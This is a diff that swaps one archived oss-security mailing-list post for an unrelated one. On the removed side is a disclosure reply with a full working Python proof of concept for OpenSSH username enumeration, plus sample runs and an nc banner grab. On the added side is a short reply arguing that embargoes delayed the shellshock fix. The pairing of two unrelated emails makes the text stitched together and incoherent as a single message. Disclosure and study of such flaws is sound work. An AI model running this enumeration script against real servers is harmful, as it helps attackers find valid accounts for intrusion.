@@ -1,126 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/16/1
-Message-ID: <CAD3CanckcSk0T5sGa4LxsShYhkTDc8u6Fgdz=jvJ90buwDiH1g@mail.gmail.com>
-Date: Thu, 16 Aug 2018 23:43:07 +1200
-From: Matthew Daley <mattd@...fuzz.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/20/1
+Message-ID: <CAJ_zFkK7P5TynG1CbrAgbudb2whsqcP+BDoxB9ABGQgcvanyBA@mail.gmail.com>
+Date: Sat, 20 Jan 2018 10:57:27 -0800
+From: Tavis Ormandy <taviso@...gle.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: OpenSSH Username Enumeration
+Subject: Re: How to deal with reporters who don't want their bugs fixed?
 Content-Type: text/plain; charset=utf-8
 
-On 16 August 2018 at 04:05, Qualys Security Advisory <qsa@...lys.com> wrote:
-> The attacker can try to authenticate a user with a malformed packet (for
-> example, a truncated packet), and:
+On Fri, Jan 19, 2018 at 6:04 AM, Igor Seletskiy <i@...udlinux.com> wrote:
+> Hi Greg,
 >
-> - if the user is invalid (it does not exist), then userauth_pubkey()
->   returns immediately, and the server sends an SSH2_MSG_USERAUTH_FAILURE
->   to the attacker;
+> I am sure you are right, as you were in the epicenter of it and saw things
+> happening. More than that -- I am really thankful to a group of people who
+> worked on fixing it for months to get us where we are. Don't get me wrong -
+> in no way, I am blaming anyone.
 >
-> - if the user is valid (it exists), then sshpkt_get_u8() fails, and the
->   server calls fatal() and closes its connection to the attacker.
+> Yet, KAISER patch & especially patch from AMD to the mailing list created a
+> lot of rumors, that I believe forced earlier disclosure -- because things
+> got into 'semi-public' state.
+> I might be wrong, I don't have all the info, and I am sure that people who
+> were at the center of it have a better understanding of what & why happened.
+>
 
-I've written a POC for this issue, located at
-https://bugfuzz.com/stuff/ssh-check-username.py . It requires the
-Paramiko library (http://www.paramiko.org/) to be available. It does
-some gross monkey patching of Paramiko to force it into sending an
-invalid `SSH2_MSG_USERAUTH_REQUEST` and intercepting the potentially
-resultant `SSH2_MSG_USERAUTH_FAILURE` but seems to work well enough. A
-sample usage is as follows:
+A better example would be shellshock, a patch was developed in private
+under embargo, but as soon as the details were public it was obvious
+the patch was incomplete. When it was finally public, we were able to
+analyze the problem and develop a real solution - the embargo did
+nothing but needlessly delay that process.
 
-$ nc test.internal 22
-SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
-^C
-$ ./ssh-check-username.py test.internal root
-[+] Valid username
-$ ./ssh-check-username.py test.internal www-data
-[+] Valid username
-$ ./ssh-check-username.py test.internal thisisinvalid
-[*] Invalid username
-
-The POC is also included below for archival purposes.
-
---- 8< ---
-
-#!/usr/bin/env python
-
-# Copyright (c) 2018 Matthew Daley
-#
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to
-# deal in the Software without restriction, including without limitation the
-# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
-# sell copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-#
-# The above copyright notice and this permission notice shall be included in
-# all copies or substantial portions of the Software.
-#
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
-# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
-# IN THE SOFTWARE.
-
-
-import argparse
-import logging
-import paramiko
-import socket
-import sys
-
-
-class InvalidUsername(Exception):
-    pass
-
-
-def add_boolean(*args, **kwargs):
-    pass
-
-
-old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
-        paramiko.common.MSG_SERVICE_ACCEPT]
-
-def service_accept(*args, **kwargs):
-    paramiko.message.Message.add_boolean = add_boolean
-    return old_service_accept(*args, **kwargs)
-
-
-def userauth_failure(*args, **kwargs):
-    raise InvalidUsername()
-
-
-paramiko.auth_handler.AuthHandler._handler_table.update({
-    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
-    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
-})
-
-logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
-
-arg_parser = argparse.ArgumentParser()
-arg_parser.add_argument('hostname', type=str)
-arg_parser.add_argument('--port', type=int, default=22)
-arg_parser.add_argument('username', type=str)
-args = arg_parser.parse_args()
-
-sock = socket.socket()
-try:
-    sock.connect((args.hostname, args.port))
-except socket.error:
-    print '[-] Failed to connect'
-    sys.exit(1)
-
-transport = paramiko.transport.Transport(sock)
-try:
-    transport.start_client()
-except paramiko.ssh_exception.SSHException:
-    print '[-] Failed to negotiate SSH transport'
-    sys.exit(2)
-
-try:
-    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
-except InvalidUsername:
-    print '[*] Invalid username'
-    sys.exit(3)
-except paramiko.ssh_exception.AuthenticationException:
-    print '[+] Valid username'
+Tavis.
